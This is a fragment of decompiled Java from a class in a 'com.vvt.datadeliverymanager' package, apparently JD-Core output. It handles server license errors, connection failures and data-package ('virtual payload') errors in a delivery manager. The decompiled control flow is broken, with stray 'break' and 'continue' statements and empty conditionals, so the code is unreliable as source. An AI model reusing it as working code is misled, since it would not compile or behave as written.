    ((i)localObject2).a(i);
    localObject3 = new java/lang/StringBuilder;
    ((StringBuilder)localObject3).<init>();
    Object localObject4 = params.f();
    localObject3 = ((StringBuilder)localObject3).append((String)localObject4).append(" (").append(i);
    localObject4 = ").";
    localObject3 = (String)localObject4;
    ((i)localObject2).a((String)localObject3);
    ((i)localObject2).b(false);
    ((i)localObject2).a(false);
    int i1 = k.c(this.a).a();
    ((i)localObject2).b(i1);
    localObject3 = k.c(this.a);
    long l = ((h)localObject3).g();
    int j;
    switch (i)
    {
    default: 
      localObject1 = k.g(this.a);
      if (localObject1 != null)
      {
        j = k.c();
        if (j != 0) {}
        localObject1 = k.g(this.a);
        ((com.vvt.datadeliverymanager.a.a)localObject1).b((i)localObject2);
      }
      break;
    }
    for (;;)
    {
      localObject1 = k.a(this.a);
      ((com.vvt.datadeliverymanager.b.b)localObject1).a(l);
      for (;;)
      {
        localObject1 = this.a;
        localObject2 = k.c(this.a).c();
        int k = ((com.vvt.phoenix.prot.command.b)localObject2).a();
        localObject3 = Status.FAILED;
        localObject4 = ErrorType.SERVER;
        Object localObject5 = params.f();
        int i2 = params.e();
        k.a((k)localObject1, k, (Status)localObject3, (ErrorType)localObject4, (String)localObject5, i2);
        localObject1 = this.a;
        k.b((k)localObject1, false);
        j = k.d();
        if (j != 0) {}
        a();
        break;
        a((i)localObject2);
        continue;
        j = 0;
        ((i)localObject2).a(null);
        ((i)localObject2).b(bool1);
        localObject1 = k.g(this.a);
        if (localObject1 != null)
        {
          j = k.c();
          if (j != 0) {}
          localObject1 = k.g(this.a);
          ((com.vvt.datadeliverymanager.a.a)localObject1).b((i)localObject2);
        }
        localObject1 = k.a(this.a);
        ((com.vvt.datadeliverymanager.b.b)localObject1).a(l);
        continue;
        localObject5 = k.g(this.a);
        if (localObject5 != null)
        {
          localObject5 = k.g(this.a);
          ((com.vvt.datadeliverymanager.a.a)localObject5).b((i)localObject2);
        }
        localObject2 = k.i(this.a);
        if (localObject2 != null)
        {
          k = 100;
          if (j != k) {
            break label679;
          }
          localObject1 = k.i(this.a);
          localObject2 = ServerStatusType.SERVER_STATUS_ERROR_LICENSE_NOT_FOUND;
          ((d)localObject1).a((ServerStatusType)localObject2);
        }
        for (;;)
        {
          localObject1 = k.a(this.a);
          ((com.vvt.datadeliverymanager.b.b)localObject1).a(l);
          break;
          label679:
          int m = 101;
          if (j == m)
          {
            localObject1 = k.i(this.a);
            localObject2 = ServerStatusType.SERVER_STATUS_ERROR_LICENSE_ALREADY_IN_USE;
            ((d)localObject1).a((ServerStatusType)localObject2);
          }
          else
          {
            int n = 105;
            if (j == n)
            {
              localObject1 = k.i(this.a);
              localObject2 = ServerStatusType.SERVER_STATUS_ERROR_LICENSE_COURRUPT;
              ((d)localObject1).a((ServerStatusType)localObject2);
            }
          }
        }
        localObject1 = k.i(this.a);
        if (localObject1 != null)
        {
          localObject1 = k.i(this.a);
          localObject5 = ServerStatusType.SERVER_STATUS_ERROR_LICENSE_EXPIRED;
          ((d)localObject1).a((ServerStatusType)localObject5);
        }
        localObject1 = k.g(this.a);
        if (localObject1 != null)
        {
          j = k.c();
          if (j != 0) {}
          localObject1 = k.g(this.a);
          ((com.vvt.datadeliverymanager.a.a)localObject1).b((i)localObject2);
        }
        localObject1 = k.a(this.a);
        ((com.vvt.datadeliverymanager.b.b)localObject1).a(l);
        continue;
        localObject1 = k.i(this.a);
        if (localObject1 != null)
        {
          localObject1 = k.i(this.a);
          localObject5 = ServerStatusType.SERVER_STATUS_ERROR_LICENSE_DISABLED;
          ((d)localObject1).a((ServerStatusType)localObject5);
        }
        localObject1 = k.g(this.a);
        if (localObject1 != null)
        {
          j = k.c();
          if (j != 0) {}
          localObject1 = k.g(this.a);
          ((com.vvt.datadeliverymanager.a.a)localObject1).b((i)localObject2);
        }
        localObject1 = k.a(this.a);
        ((com.vvt.datadeliverymanager.b.b)localObject1).a(l);
        continue;
        localObject1 = k.i(this.a);
        if (localObject1 != null)
        {
          localObject1 = k.i(this.a);
          localObject5 = ServerStatusType.SERVER_STATUS_ERROR_DEVICE_ID_NOT_FOUND;
          ((d)localObject1).a((ServerStatusType)localObject5);
        }
        localObject1 = k.g(this.a);
        if (localObject1 != null)
        {
          j = k.f();
          if (j != 0) {}
          localObject1 = k.g(this.a);
          ((com.vvt.datadeliverymanager.a.a)localObject1).b((i)localObject2);
        }
        localObject1 = k.a(this.a);
        ((com.vvt.datadeliverymanager.b.b)localObject1).a(l);
      }
      j = k.c();
      if (j == 0) {}
    }
  }
  
  public void c(long paramLong, Exception paramException)
  {
    Status localStatus = null;
    int i = -1;
    boolean bool = k.d();
    if (bool) {}
    bool = k.c();
    if (bool) {}
    bool = k.c();
    if (bool) {}
    Object localObject1 = k.c(this.a);
    if (localObject1 == null)
    {
      bool = k.e();
      if (bool) {}
      return;
    }
    k.b(this.a, true);
    localObject1 = new com/vvt/datadeliverymanager/i;
    ((i)localObject1).<init>();
    ((i)localObject1).a(null);
    Object localObject2 = k.c(this.a).j();
    ((i)localObject1).a((DataProviderType)localObject2);
    localObject2 = ErrorResponseType.ERROR_CONNECTION;
    ((i)localObject1).a((ErrorResponseType)localObject2);
    ((i)localObject1).a(i);
    ((i)localObject1).a(null);
    ((i)localObject1).b(false);
    int j = k.c(this.a).a();
    ((i)localObject1).b(j);
    a((i)localObject1);
    localObject1 = this.a;
    localObject2 = k.c(this.a).c();
    j = ((com.vvt.phoenix.prot.command.b)localObject2).a();
    localStatus = Status.FAILED;
    ErrorType localErrorType = ErrorType.HTTP;
    String str = paramException.getMessage();
    if (str == null) {}
    for (str = "Connection error!";; str = paramException.getMessage())
    {
      k.a((k)localObject1, j, localStatus, localErrorType, str, i);
      localObject1 = this.a;
      k.b((k)localObject1, false);
      bool = k.d();
      if (bool) {}
      a();
      break;
    }
  }
  
  public void d(long paramLong, Exception paramException)
  {
    boolean bool1 = true;
    boolean bool2 = k.c();
    if (bool2) {}
    bool2 = k.c();
    if (bool2) {}
    Object localObject1 = this.a;
    Object localObject2 = k.c(this.a).c();
    int j = ((com.vvt.phoenix.prot.command.b)localObject2).a();
    Object localObject3 = Status.FAILED;
    Object localObject4 = ErrorType.HTTP;
    String str = "On virtual payload error. Make sure your Internet connection is active";
    int k = -1;
    k.a((k)localObject1, j, (Status)localObject3, (ErrorType)localObject4, str, k);
    localObject1 = k.c(this.a);
    if (localObject1 == null)
    {
      bool2 = k.e();
      if (bool2) {}
      return;
    }
    k.b(this.a, bool1);
    localObject2 = new com/vvt/datadeliverymanager/i;
    ((i)localObject2).<init>();
    ((i)localObject2).a(null);
    localObject1 = k.c(this.a).j();
    ((i)localObject2).a((DataProviderType)localObject1);
    localObject1 = ErrorResponseType.ERROR_PAYLOAD;
    ((i)localObject2).a((ErrorResponseType)localObject1);
    int i = 312;
    ((i)localObject2).a(i);
    localObject3 = "Virtual payload creation error (-353). %s.";
    localObject4 = new Object[bool1];
    label198:
    boolean bool3;
    if (paramException != null)
    {
      localObject1 = paramException.toString();
      localObject4[0] = localObject1;
      localObject1 = String.format((String)localObject3, (Object[])localObject4);
      ((i)localObject2).a((String)localObject1);
      ((i)localObject2).b(false);
      ((i)localObject2).a(false);
      i = k.c(this.a).a();
      ((i)localObject2).b(i);
      k.a(this.a).a(paramLong);
      localObject1 = k.g(this.a);
      if (localObject1 == null) {
        break label341;
      }
      bool3 = k.f();
      if (bool3) {}
      localObject1 = k.g(this.a);
      ((com.vvt.datadeliverymanager.a.a)localObject1).b((i)localObject2);
    }
    for (;;)
    {
      localObject1 = this.a;
      k.b((k)localObject1, false);
      bool3 = k.d();
      if (bool3) {}
      a();
      break;
      localObject1 = "";
      break label198;
      label341:
      bool3 = k.f();
      if (!bool3) {}
    }
  }
  
  public void run()
  {
    boolean bool = k.d();
    if (bool) {}
    Looper.prepare();
    a();
    Looper.loop();
    bool = k.d();
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/datadeliverymanager/m.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */